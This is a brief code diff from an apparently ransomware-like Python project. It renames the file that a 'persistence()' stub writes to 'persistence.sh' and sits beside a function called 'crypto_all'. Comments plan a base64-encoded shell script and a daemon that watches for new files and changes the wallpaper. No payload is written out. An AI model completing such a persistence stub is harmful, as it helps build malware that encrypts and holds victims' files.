@@ -186,9 +186,9 @@ def crypto_all():
 
 def persistence():
     def generate_sh(): # still working around how to make a sh file
-        f = open('gc_script.sh','wb')
+        f = open('persistence.sh','wb')
         script = '''
-        ''' # it should be an encoded base64 
+        ''' # it should be an encoded base64
         f.write(script)
         # it should have -> daemon wating for new files / change wallpaper /
 
